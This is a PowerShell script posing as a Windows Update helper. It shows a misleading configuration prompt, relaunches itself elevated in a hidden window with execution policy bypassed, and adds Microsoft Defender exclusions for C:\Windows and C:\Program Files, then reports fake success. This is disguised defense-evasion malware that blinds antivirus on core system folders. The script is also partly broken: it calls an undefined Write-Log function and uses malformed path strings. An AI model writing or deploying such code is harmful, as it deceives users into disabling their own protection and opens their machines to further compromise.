# Define a log file path accessible by most users (including LocalSystem)
$logPath = "C:\Windows\Temp\updater_log.txt"

try {
    # Get the current user running the script
    $currentUser = whoami

    # Create a log message with date and user info
    $logMessage = "UpdaterSrv script executed at $(Get-Date) by user $currentUser"

    # Append the log message to the log file
    $logMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}
catch {
    # If writing to log fails, capture error details
    $errorMessage = "Failed to write log at $(Get-Date). Error: $_"
    $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Check if exclusions exist
function Test-Exclusions {
    $exclusions = (Get-MpPreference).ExclusionPath
    $requiredExclusions = @(
            "$env:C:\Windows",
            "$env:C:\Program Files"
    )
    
    foreach ($exclusion in $requiredExclusions) {
        if ($exclusion -notin $exclusions) {
            return $false
        }
    }
    return $true
}

# Main execution
try {
    Write-Log "Windows Update Helper started"
    
    # Check if exclusions are already set
    if (Test-Exclusions) {
        Write-Log "Required exclusions already exist"
        exit 0
    }

    # Show user prompt if exclusions are needed
    $caption = "Windows Update Configuration"
    $message = "The Windows Update service requires additional configuration to ensure proper functionality.`n`nThis will make temporary changes to your security settings."
    $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Continue", "Proceed with configuration"
    $no = New-Object System.Management.Automation.Host.ChoiceDescription "&Cancel", "Skip this configuration"
    $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    $result = $host.UI.PromptForChoice($caption, $message, $options, 0)

    if ($result -eq 0) {
        # Verify admin rights
        if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Log "Requesting elevation to set exclusions"
            
            # Restart script as admin
            $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
            Start-Process powershell -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
            exit
        }

        # Set exclusions (now running as admin)
        Write-Log "Setting required exclusions"
        $exclusions = @(
            "$env:C:\Windows",
            "$env:C:\Program Files"
        )
        
        foreach ($path in $exclusions) {
            if (-not (Test-Path $path)) {
                New-Item -ItemType Directory -Path $path -Force | Out-Null
            }
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
        }
        
        Write-Log "Exclusions set successfully"
        
        # Show completion message
        $wshell = New-Object -ComObject Wscript.Shell
        $wshell.Popup("Windows Update has been configured successfully.", 0, "Configuration Complete", 0x40)
    }
    else {
        Write-Log "User declined configuration"
    }
}
catch {
    Write-Log "Error encountered: $_"
    $wshell = New-Object -ComObject Wscript.Shell
    $wshell.Popup("An error occurred during configuration. Please try again later.", 0, "Configuration Error", 0x10)
}
